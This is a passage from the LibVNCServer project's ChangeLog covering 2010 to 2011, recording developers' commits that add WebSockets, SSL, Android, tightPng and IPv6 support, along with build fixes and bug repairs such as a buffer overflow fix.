2011-08-25  Gernot Tenchio <gernot@tenchio.de>

	* libvncserver/websockets.c: websockets: nothing to worry about

2011-08-25  Gernot Tenchio <gernot@tenchio.de>

	* libvncserver/websockets.c: websockets: added gcrypt based sha1
	digest funtion

2011-08-25  Joel Martin <jmartin@sentryds.com>

	* common/sha1.c, common/sha1.h, libvncserver/Makefile.am,
	libvncserver/websockets.c: Add sha1.*. Remove UTF-8 encode. Protocol
	handling.  Add common/sha1.h and common/sha1.c so that we have the SHA routines
	even if openssl is not available. From the IETF SHA RFC example
	code.  Remove the UTF-8 encoding hack. This was really just an experiment.  If the protocol passed in the handshake has "binary" then don't
	base64 encode for the HyBi protocol. This will allow noVNC to
	request the binary data be passed raw and not base64 encoded.
	Unfortunately, the client doesn't speak first in VNC protocol (bad
	original design). If it did then we could determine whether to
	base64 encode or not based on the first HyBi frame from the client
	and whether the binary bit is set or not. Oh well.  Misc Cleanup: - Always free response and buf in handshake routine.  - Remove some unused variables.

2011-08-25  Gernot Tenchio <gernot@tenchio.de>

	* CMakeLists.txt: cmake: make some noise

2011-08-25  Gernot Tenchio <gernot@tenchio.de>

	* libvncserver/rfbssl_gnutls.c: websockets: remove warning on 64bit
	platforms

2011-08-25  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/websockets.c: websockets: Removed debugging left over

2011-08-25  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/websockets.c: websockets: Use callback functions for
	encode/decode

2011-08-25  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/rfbserver.c, libvncserver/sockets.c,
	libvncserver/websockets.c, rfb/rfb.h: websockets: Move Hixie
	disconnect hack to websockets.c Move the hixie disconnect hack to websockets.c. Removed the
	remaining websockets vars from rfbClientPtr, so all websockets stuff
	is hidden behind an opaque pointer.

2011-08-25  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/rfbserver.c, libvncserver/sockets.c,
	libvncserver/websockets.c, rfb/rfb.h: websockets: Initial HyBi
	support

2011-08-16  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* CMakeLists.txt: cmake: don't link sdl libs to vnc libraries Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-16  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/sockets.c, libvncserver/websockets.c, rfb/rfb.h: 
	websockets: Add wspath member to rfbClientRec Added wspath member to rfbClientRec which holds the path component
	of the initial websocket request.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-16  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* CMakeLists.txt, {libvncserver => common}/md5.c, {libvncserver =>
	common}/md5.h, libvncserver/Makefile.am: Move libvncserver/md5* to
	common Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-16  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* CMakeLists.txt, rfb/rfbconfig.h.cmake: websockets: Add Websockets
	support to CMakeLists.txt Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-16  Joel Martin <github@martintribe.org>

	* libvncserver/Makefile.am, libvncserver/cargs.c: websockets: Add
	SSL cert command line options.  - Add --sslcertfile and --sslkeyfile. These should really be
	  combined with the existing x11vnc command line options for SSL
	support.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-17  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* configure.ac, libvncserver/Makefile.am,
	libvncserver/rfbssl_gnutls.c, libvncserver/rfbssl_openssl.c: 
	websockets: add GnuTLS and OpenSSL support For now, only OpenSSL support is activated through configure, since
	GnuTLS is only used in LibVNCClient.  [jes: separated this out from the commit adding encryption support,
	added autoconf support.] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-16  Gernot Tenchio <gernot.tenchio@securepoint.de>

	* libvncserver/Makefile.am, libvncserver/rfbserver.c,
	libvncserver/rfbssl.h, libvncserver/rfbssl_none.c,
	libvncserver/sockets.c, libvncserver/websockets.c, rfb/rfb.h: 
	websockets: Add encryption support [jes: moved out GnuTLS and OpenSSL support, added a dummy support,
	to separate changes better, and to keep things compiling] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-16  Joel Martin <jmartin@sentryds.com>

	* libvncserver/websockets.c: websockets: Properly parse Hixie-76
	handshake.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-16  Joel Martin <github@martintribe.org>

	* libvncserver/rfbserver.c, libvncserver/websockets.c: websockets:
	Add UTF-8 encoding support.  This is not completely standard UTF-8 encoding. Only code points
	0-255 are encoded and never encoded to more than two octets. Since
	'\x00' is a WebSockets framing character, it's easier for all
	parties to encode zero as '\xc4\x80', i.e. 194+128, i.e. UTF-8 256.  This means that a random stream will be slightly more than 50%
	larger using this encoding scheme. But it's easy CPU-wise for client
	and server to decode/encode. This is especially important for
	clients written in languages that have weak bitops, like Javascript
	(i.e. the noVNC client).  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-16  Joel Martin <github@martintribe.org>

	* libvncserver/rfbserver.c: websockets: Better disconnect detection.  If the only thing we are waiting on is a WebSockets terminator, then
	remove it from the stream early on in rfbProcessClientNormalMessage.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-16  Joel Martin <github@martintribe.org>

	* configure.ac, libvncserver/Makefile.am, libvncserver/md5.c,
	libvncserver/md5.h, libvncserver/rfbserver.c,
	libvncserver/sockets.c, libvncserver/websockets.c, rfb/rfb.h: 
	websockets: Initial WebSockets support.  Has a bug: WebSocket client disconnects are not detected.
	rfbSendFramebufferUpdate is doing a MSG_PEEK recv to determine if
	enough data is available which prevents a disconnect from being
	detected.  Otherwise it's working pretty well.  [jes: moved added struct members to the end for binary compatibility
	with previous LibVNCServer versions, removed an unused variable] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-08-17  Johannes Schindelin <johannes.schindelin@gmx.de>

	* .gitignore: .gitignore: zippy has moved Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-07-25  Christian Beier <dontmind@freeshell.org>

	* examples/android/README: Add installation hints to android example
	README.

2011-07-22  William Roberts <wroberts@sta.samsung.com>

	* examples/android/jni/fbvncserver.c: Reduced memory footprint by
	50%

2011-07-22  William Roberts <wroberts@sta.samsung.com>

	* examples/android/jni/fbvncserver.c: Corrected resolution issue,
	but screen is getting reported as wrong size

2011-07-23  ckanru <ckanru@code.google.com>

	* examples/android/jni/fbvncserver.c: Fixes running vncserver on
	beagleboard/0xdroid and possibly any device without a touch screen.
	Because fake touch screen always report zero when query device
	information, coordinates transformation is not needed.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-07-23  Christian Beier <dontmind@freeshell.org>

	* configure.ac, examples/Makefile.am, examples/android/Makefile.am,
	rfb/rfb.h, vncterm/Makefile.am: Adopt autotools build system to
	Android.  LibVNCServer/LibVNCClient now build for Android!

2011-07-23  Christian Beier <dontmind@freeshell.org>

	* examples/android/README, examples/android/jni/Android.mk,
	examples/android/jni/fbvncserver.c: Add androidvncserver example.

2011-07-22  letsgoustc <letsgoustc@gmail.com>

	* rfb/rfb.h: Make LibVNCServer build for Android.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-07-19  Joel Martin <github@martintribe.org>

	* libvncserver/tight.c: tightPng: check even for SendGradientRect.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-07-19  Joel Martin <github@martintribe.org>

	* CMakeLists.txt, configure.ac, libvncserver/Makefile.am,
	libvncserver/rfbserver.c, libvncserver/stats.c,
	libvncserver/tight.c, rfb/rfb.h, rfb/rfbconfig.h.cmake,
	rfb/rfbproto.h: tightPng: Add initial tightPng encoding support.  http://wiki.qemu.org/VNC_Tight_PNG Signed-off-by: Joel Martin <github@martintribe.org> Signed-off-by:
	Christian Beier <dontmind@freeshell.org>

2011-06-01  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c, libvncserver/sockets.c: Remove some unused
	variables.

2010-11-14  George Kiagiadakis <kiagiadakis.george@gmail.com>

	* libvncserver/sockets.c, rfb/rfb.h: Fix rfbProcessNewConnection to
	return some value instead of void.  BUG: 256891 Signed-off-by: Christian Beier <dontmind@freeshell.org>

2010-11-10  George Kiagiadakis <kiagiadakis.george@gmail.com>

	* libvncserver/main.c, libvncserver/sockets.c, rfb/rfb.h: Split two
	event-loop related functions out of the rfbProcessEvents()
	mechanism.  This is required to be able to do proper event loop integration with
	Qt.  Idea was taken from vino's libvncserver fork.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-05-06  Cristian Rodríguez <crrodriguez@opensuse.org>

	* libvncserver/tightvnc-filetransfer/filetransfermsg.c: Fix buffer
	overflow Signed-off-by: Cristian RodrÃ­guez <crrodriguez@opensuse.org>
	Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-04-30  Christian Beier <dontmind@freeshell.org>

	* libvncserver/tight.c: Revert "Fix memory corruption bug." This reverts commit c1363fa9583ed41b94fbc79b3ff410b7d5189407.  The proper fix was already in
	804335f9d296440bb708ca844f5d89b58b50b0c6.

2011-04-28  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: UTF-8ify AUTHORS Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-04-28  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: Update AUTHORS Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-11-10  George Kiagiadakis <kiagiadakis.george@gmail.com>

	* libvncserver/tight.c: Fix memory corruption bug.  This bug occured when a second telepathy tubes client was connected
	after the first one had disconnected and the channel (thus, the
	screen too) had been destroyed.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-11-10  George Kiagiadakis <kiagiadakis.george@gmail.com>

	* common/zywrletemplate.c, libvncserver/auth.c,
	libvncserver/rfbserver.c, libvncserver/scale.c,
	libvncserver/scale.h, rfb/rfb.h: Fix compilation in c89 mode.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-04-27  Vic Lee <llyzs@163.com>

	* libvncclient/tls.c: Replace deprecated GnuTLS functions
	gnutls_*_set_priority with gnutls_priority_set_direct.  The functions gnutls_*_set_priority we used were marked deprecated
	since latest GnuTLS version 2.12. However the replacement function
	gnutls_priority_set_direct is available since 2.2, which is even
	lower than our version requirement 2.4 in configure. The patch just
	replace the deprecate function to fix the compile warning.  Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Johannes
	Schindelin <johannes.schindelin@gmx.de>

2011-03-30  Christian Beier <dontmind@freeshell.org>

	* ChangeLog: Update ChangeLog for 0.9.8.

2011-03-29  Christian Beier <dontmind@freeshell.org>

	* README: Remove RDP from the README description.  We do VNC but no RDP. Pointed out by Vic Lee, thanks!

2011-03-29  Christian Beier <dontmind@freeshell.org>

	* utils/git2cl.pl: Fix skipping of merge commits in log convert
	script.

2011-03-29  Christian Beier <dontmind@freeshell.org>

	* bdf2c.pl => utils/bdf2c.pl, consolefont2c.pl =>
	utils/consolefont2c.pl, utils/git2cl.pl: Add a git-log to GNU-Style
	ChangeLog converter script.  Also put all helper scripts into a utils directory.

2011-03-28  Christian Beier <dontmind@freeshell.org>

	* NEWS: Mention the pkg-config stuff in NEWS.

2011-03-27  Vic Lee <llyzs@163.com>

	* .gitignore, Makefile.am, configure.ac, libvncclient.pc.in,
	libvncserver.pc.in: Add libvncserver.pc and libvncclient.pc files.  Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Christian
	Beier <dontmind@freeshell.org>

2011-03-17  Christian Beier <dontmind@freeshell.org>

	* libvncclient/ultra.c, libvncserver/ultra.c: Fix regression in
	Ultra encoding introduced by commit
	fe1ca16e9b75b5f38ab374c8dfff92d2c3ea4532.  My bad. There we see what the encodings test is good for ;-)

2011-03-17  Christian Beier <dontmind@freeshell.org>

	* test/encodingstest.c: Update encodingstest.  * Fixed segfault on shutdown.  * Updated to test all encodings.  * Fixed to operate with encodings that split up rects into   smaller rects.

2011-03-17  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: Remove useless comparisons that always
	evaluate to false.  There can not be more than 255 security types and MSLogon is RFB 3.6
	only.

2011-03-17  Christian Beier <dontmind@freeshell.org>

	* examples/rotate.c, examples/rotatetemplate.c, examples/vncev.c,
	libvncclient/listen.c, libvncclient/rfbproto.c,
	libvncclient/ultra.c, libvncclient/zrle.c,
	libvncserver/rfbserver.c, libvncserver/ultra.c: Fix (most) MinGW32
	compiler warnings.

2011-03-17  Christian Beier <dontmind@freeshell.org>

	* examples/rotate.c, examples/zippy.c, libvncserver/zrle.c,
	libvncserver/zrleencodetemplate.c: Fix remaining compiler warnings.

2011-03-17  Christian Beier <dontmind@freeshell.org>

	* VisualNaCro/nacro.c, examples/backchannel.c, examples/camera.c,
	examples/colourmaptest.c, examples/example.c,
	examples/filetransfer.c, examples/fontsel.c, examples/mac.c,
	examples/pnmshow.c, examples/pnmshow24.c, examples/simple.c,
	examples/simple15.c, examples/vncev.c, examples/zippy.c,
	test/cargstest.c, test/copyrecttest.c, test/cursortest.c,
	test/encodingstest.c: Check rfbGetScreen() return value everywhere.  This fixes a segfault when a server is invoked with the '-help'
	commandline argument.

2011-03-12  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfbconfig.h.cmake: CMake: Check for libgcrypt
	availability.

2011-03-12  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: Threads can be available even if SDL is
	not.

2011-03-12  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: fix building SDLvncviewer.

2011-03-12  Christian Beier <dontmind@freeshell.org>

	* Makefile.am: Include cmake configure file templates in dist
	tarball.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-03-12  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbconfig.h.in, rfb/stamp-h.in: Remove autogenerated files.

2011-03-12  Christian Beier <dontmind@freeshell.org>

	* NEWS: Update NEWS for 0.9.8 release.

2011-03-07  Christian Beier <dontmind@freeshell.org>

	* libvncclient/tls.c: Fix libvncclient TLS for Windows builds.  GnuTLS seems to expect proper errno values internally. So set them
	in our custom push/pull functions. Parts of the patch stolen from
	libcurl, thanks! Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-03-07  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: Let libvncclient build with gcrypt for
	MinGW32 builds.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-03-07  Vic Lee <llyzs@163.com>

	* libvncclient/sockets.c: Use WaitForMessage instead of sleep in
	socket reading to fix performance issue.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-03-10  Christian Beier <dontmind@freeshell.org>

	* common/d3des.c, common/d3des.h, libvncserver/auth.c,
	libvncserver/corre.c, libvncserver/cutpaste.c, libvncserver/draw.c,
	libvncserver/font.c, libvncserver/hextile.c, libvncserver/httpd.c,
	libvncserver/rfbregion.c, libvncserver/rre.c,
	libvncserver/selbox.c, libvncserver/sockets.c,
	libvncserver/stats.c, libvncserver/tableinit24.c,
	libvncserver/tableinitcmtemplate.c,
	libvncserver/tableinittctemplate.c,
	libvncserver/tabletrans24template.c,
	libvncserver/tabletranstemplate.c, libvncserver/translate.c,
	libvncserver/zrletypes.h, rfb/rfbregion.h, test/blooptest.c,
	test/cursortest.c: Set proper file permissions for source files.

2011-03-10  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, configure.ac: Next version will be 0.9.8.

2011-03-10  Christian Beier <dontmind@freeshell.org>

	* Makefile.am, configure.ac, contrib/Makefile.am,
	examples/Makefile.am, {contrib => examples}/zippy.c: Move zippy.c to
	examples.

2011-03-03  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c, libvncclient/tls.c, libvncserver/httpd.c,
	libvncserver/rfbserver.c, libvncserver/sockets.c: Call
	WSAGetLastError() everywhere errno is read after a Winsock call.  Winsock does NOT update errno for us, we have fetch the last error
	manually using WSAGetLastError().

2011-01-29  Christian Beier <dontmind@freeshell.org>

	* common/lzoconf.h, common/lzodefs.h, common/minilzo.c,
	common/minilzo.h, libvncclient/Makefile.am,
	libvncserver/Makefile.am: Update minilzo library used for Ultra
	encoding to ver 2.04.  According to the minilzo README, this brings a significant speedup
	on 64-bit architechtures.  Changes compared to old version 1.08 can be found here:
	http://www.oberhumer.com/opensource/lzo/lzonews.php Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-01-24  Christian Beier <dontmind@freeshell.org>

	* libvncserver/corre.c, libvncserver/main.c,
	libvncserver/private.h, libvncserver/rfbserver.c,
	libvncserver/rre.c, libvncserver/ultra.c, rfb/rfb.h: libvncserver:
	Make RRE, CoRRE and Ultra encodings thread-safe.  This adds generic before/after encoding buffers to the rfbClient
	struct, so there is no need for thread local storage.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-02-02  Christian Beier <dontmind@freeshell.org>

	* Makefile.am: Include CMakeLists.txt file in dist tarball.

2011-01-29  Christian Beier <dontmind@freeshell.org>

	* .cvsignore, README.cvs, VisualNaCro/.cvsignore,
	classes/.cvsignore, client_examples/.cvsignore, contrib/.cvsignore,
	cvs_update_anonymously, examples/.cvsignore,
	libvncclient/.cvsignore, libvncserver/.cvsignore,
	libvncserver/tightvnc-filetransfer/.cvsignore, rfb/.cvsignore,
	test/.cvsignore, vncterm/.cvsignore: Remove unneeded files
	concerning CVS.  We have a git repo nowadays and I guess we won't go back to CVS.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-01-31  Johannes Schindelin <johannes.schindelin@gmx.de>

	* examples/example.dsp, libvncserver.dsp, libvncserver.dsw: Remove
	completely broken Visual Studio project files If people seriously consider building with Visual Studio, there is
	always CMake.  Pointed out by Christian Beier.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-01-31  Christian Beier <dontmind@freeshell.org>

	* client_examples/Makefile.am, client_examples/SDLvncviewer.c: 
	SDLvncviewer: fix compilation from dist tarball.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2011-01-21  Vic Lee <llyzs@163.com>

	* acinclude.m4, configure.ac, libvncclient/rfbproto.c,
	rfb/rfbproto.h: Add ARD (Apple Remote Desktop) security type support Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Christian
	Beier <dontmind@freeshell.org>

2011-01-25  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, {libvncserver => common}/d3des.c, {libvncserver
	=> common}/d3des.h, {libvncclient => common}/lzoconf.h,
	{libvncserver => common}/minilzo.c, {libvncserver =>
	common}/minilzo.h, {libvncserver => common}/vncauth.c,
	{libvncserver => common}/zywrletemplate.c,
	libvncclient/Makefile.am, libvncclient/minilzo.c,
	libvncclient/minilzo.h, libvncclient/rfbproto.c,
	libvncclient/zrle.c, libvncserver/Makefile.am,
	libvncserver/lzoconf.h: Put files used by both libs into a 'common'
	dir.  No functional changes. All files used by _both_ libvncserver and
	libvncclient are put into a 'common' directory and references from
	other files as well as Autotools and CMake build systems are
	updated.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2011-01-20  ebola_rulez <ebola_rulez@users.sourceforge.net>

	* libvncserver/vncauth.c: Fix two errors found by cppcheck Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Christian
	Beier <dontmind@freeshell.org>

2011-01-01  runge <runge@karlrunge.com>

	* libvncserver/rfbserver.c: Remove never used protocol version name
	string.

2010-12-29  runge <runge@karlrunge.com>

	* configure.ac, x11vnc/ChangeLog, x11vnc/Makefile.am,
	x11vnc/README, x11vnc/avahi.c, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/connections.h, x11vnc/help.c,
	x11vnc/inet.c, x11vnc/inet.h, x11vnc/macosx.c, x11vnc/macosxCG.c,
	x11vnc/macosxCG.h, x11vnc/macosx_opengl.c, x11vnc/macosx_opengl.h,
	x11vnc/options.c, x11vnc/options.h, x11vnc/rates.c,
	x11vnc/screen.c, x11vnc/ssltools.h, x11vnc/util.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c,
	x11vnc/xwrappers.c: x11vnc: Use opengl to read screen on macosx.
	non-deprecated macosx interfaces for input injection.

2010-12-21  runge <runge@karlrunge.com>

	* configure.ac, prepare_x11vnc_dist.sh, x11vnc/README,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: x11vnc: force
	--with-system-libvncserver to use correct headers.

2010-12-21  runge <runge@karlrunge.com>

	* classes/ssl/ss_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-cursor-colors+no-tab
	-traversal.patch,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	prepare_x11vnc_dist.sh, x11vnc/8to24.c, x11vnc/ChangeLog,
	x11vnc/Makefile.am, x11vnc/README, x11vnc/RELEASE-NOTES,
	x11vnc/appshare.c, x11vnc/cleanup.c, x11vnc/gui.c, x11vnc/help.c,
	x11vnc/keyboard.c, x11vnc/keyboard.h, x11vnc/linuxfb.c,
	x11vnc/macosx.c, x11vnc/macosxCG.c, x11vnc/misc/Makefile.am,
	x11vnc/misc/README, x11vnc/misc/qt_tslib_inject.pl,
	x11vnc/misc/uinput.pl, x11vnc/pointer.c, x11vnc/remote.c,
	x11vnc/scan.c, x11vnc/screen.c, x11vnc/sslhelper.c,
	x11vnc/ssltools.h, x11vnc/uinput.c, x11vnc/uinput.h,
	x11vnc/unixpw.c, x11vnc/user.c, x11vnc/util.h, x11vnc/v4l.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xevents.c, x11vnc/xevents.h,
	x11vnc/xrecord.c, x11vnc/xrecord.h, x11vnc/xwrappers.c: x11vnc:
	touchscreen uinput support and Java viewer mousewheel support.  See
	x11vnc/ChangeLog for rest.

2010-12-01  Tobias Doerffel <tobias.doerffel@gmail.com>

	* libvncserver/sockets.c: libvncserver sockets: check cl->screen
	before accessing it In commit 079394ca5b14d8067b95a9cf95a834828b4425a6 new code with
	insufficient checks was introduced causing a segfault when doing a
	HTTP server connection. Such connections have no screen set in the
	client data structure.  Signed-off-by: Tobias Doerffel <tobias.doerffel@gmail.com>

2010-11-30  Christian Beier <dontmind@freeshell.org>

	* Doxyfile: Doxygen documentation: actually add Doxyfile.

2010-11-29  Johannes Schindelin <johannes.schindelin@gmx.de>

	* index.html, success.html: The website is now maintained
	independently Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-11-18  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c, client_examples/backchannel.c,
	client_examples/ppmtest.c, client_examples/vnc2mpg.c,
	examples/backchannel.c, examples/camera.c, examples/example.c,
	examples/filetransfer.c, examples/pnmshow.c, examples/pnmshow24.c,
	examples/vncev.c, rfb/rfb.h, rfb/rfbclient.h, rfb/rfbproto.h: Add
	doxygen documentation support.      Adds automagically generating libvncserver/libvncclient API     documentation using doxygen. This gives a nice overview on both
	    APIs, include dependencies and function call/caller
	dependencies.      TODO: Modify all the explaining comments in the .c files for use
	          with doxygen as well.      This patch only changes comments, no functional changes at all! Signed-off-by: Christian Beier <dontmind@freeshell.org>

2010-11-18  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c: libvncserver: fix endless loop when server
	closed client in threaded mode.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2010-11-18  Christian Beier <dontmind@freeshell.org>

	* libvncserver/sockets.c: libvncserver sockets: favor per-screen
	maxclientwait over global one when set.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2010-11-11  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c, libvncserver/stats.c, rfb/rfbproto.h: 
	libvncserver cleanup: remove rfbKeyFrame remnants.

2010-11-02  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/stats.c, rfb/rfb.h,
	rfb/rfbclient.h, rfb/rfbproto.h: libvnc[server|client]: implement
	xvp VNC extension.  This implements the xvp VNC extension, which is described in the
	community version of the RFB protocol:
	http://tigervnc.sourceforge.net/cgi-bin/rfbproto It is also
	mentioned in the official RFB protocol.

2010-10-28  Tobias Doerffel <tobias.doerffel@gmail.com>

	* libvncserver/main.c: Added missing initialization of extension
	mutex When not calling rfbRegisterProtocolExtension() the extension mutex
	is uninitialized but used upon calling rfbGetExtensionIterator() and
	rfbReleaseExtensionIterator() in rfbNewTCPOrUDPClient(). This causes
	libvncserver to crash on Win32 when building with thread support.  Signed-off-by: Tobias Doerffel <tobias.doerffel@gmail.com>
	Signed-off-by: Christian Beier <dontmind@freeshell.org>

2010-10-21  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c, rfb/rfbproto.h: Only define strncasecmp
	to _strnicmp when using MS compiler.  Redefining strncasecmp to _strnicmp makes libvncclient hang forever
	in SetFormatAndEncodings() on Windows when built with MinGW64.  Reported by Tobias Doerffel <tobias.doerffel@gmail.com>, thanks!

2010-10-20  Tobias Doerffel <tobias.doerffel@gmail.com>

	* libvncserver/rfbserver.c: In rfbSendDirContent() we have to make
	sure to call closedir() before returning. This did not happen if
	rfbSendFileTransferMessage() failed.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2010-10-20  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sockets.c: Fix build failure wrt IP QoS support in
	libvncclient.  This is a small addendum to
	0797e42a4aaf8131ae71899faea2d682ed81cb59.  Seems that having IPv6
	support in the OS does not necessarily mean that IPV6_TCLASS is
	available. One such case seems to be Mac OS X 10.5.

2010-02-09  Vic Lee <llyzs@163.com>

	* libvncclient/sockets.c: Avoid 100% CPU usage when calling
	ReadFromRFBServer and no available bytes to read Signed-off-by: Vic Lee <llyzs@163.com> Signed-off-by: Christian
	Beier <dontmind@freeshell.org>

2010-10-08  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbproto.h: rfb/rfbproto.h: Prefix WORDS_BIGENDIAN when it is
	defined.  Some (all?) autotool versions do not properly prefix WORDS_BIGENDIAN
	with LIBVNCSERVER_, so do that manually here.  Thanks to Lorenz Kolb for reporting.

2010-09-29  Christian Beier <dontmind@freeshell.org>

	* TODO, libvncclient/rfbproto.c, libvncclient/sockets.c,
	libvncclient/vncviewer.c, rfb/rfbclient.h: IP QoS support in
	libvncclient.  This enables setting the DSCP/Traffic Class field of IP/IPv6 packets
	sent by a client. For example starting a client with -qosdscp 184
	marks all outgoing traffic for expedited forwarding.  Implementation for Win32 is still a TODO, though. See

	http://betelco.blogspot.com/2009/03/dscp-marking-under-windows-at.htmlfor an overview of the Win32 QoS API mess...

2010-09-07  Christian Beier <dontmind@freeshell.org>

	* TODO, libvncclient/sockets.c, libvncserver/httpd.c,
	libvncserver/rfbserver.c, libvncserver/sockets.c, rfb/rfb.h: 
	Non-blocking sockets for Windows.  Expands the SetNonBlocking() function in libvncclient/sockets.c to
	also work under Windows and also changes it to honour maybe already
	present socket flags.  A similar function was introduced for libvncserver as well and all
	the #ifdef'ed fnctl calls replaced with calls to that one.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2010-09-06  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c, libvncserver/rfbserver.c,
	libvncserver/scale.c: Cleanup: remove CORBA stuff.  The header file and most of the functions referred to do not exist
	in libvncserver.  Signed-off-by: Christian Beier <dontmind@freeshell.org>

2010-09-10  runge <runge@karlrunge.com>

	* classes/ssl/ss_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: update
	classes/ssl jars, patches, and script

2010-09-10  runge <runge@karlrunge.com>

	* prepare_x11vnc_dist.sh, x11vnc/8to24.c, x11vnc/ChangeLog,
	x11vnc/Makefile.am, x11vnc/README, x11vnc/avahi.c, x11vnc/avahi.h,
	x11vnc/cleanup.c, x11vnc/connections.c, x11vnc/help.c,
	x11vnc/inet.c, x11vnc/keyboard.c, x11vnc/misc/ultravnc_repeater.pl,
	x11vnc/options.c, x11vnc/options.h, x11vnc/pointer.c,
	x11vnc/pointer.h, x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c, x11vnc/xevents.c, x11vnc/xwrappers.c: update
	to x11vnc 0.9.12

2010-09-06  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c, libvncserver/tight.c: Fix MinGW32
	compilation with libjpeg.  MinGW32 (or more exactly, a rpcndr.h file included by winsock2.h)
	typedefs a 'boolean' type that jmorecfg.h included by jpeglib.h also
	tries to typedef.  So, tell the jpeg headers.  Closes: 3007302

2010-07-11  Christian Beier <dontmind@freeshell.org>

	* configure.ac, libvncclient/sockets.c: Fix MinGW32 checking for
	IPv6.  Signed-off-by: Christian Beier <dontmind@freeshell.org>
	Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2010-06-29  Vic Lee <llyzs@163.com>

	* configure.ac, libvncclient/rfbproto.c, libvncclient/sockets.c,
	rfb/rfbclient.h: libvncclient: add ipv6 support [jes: pulled the "host" declarations into the conditionally compiled
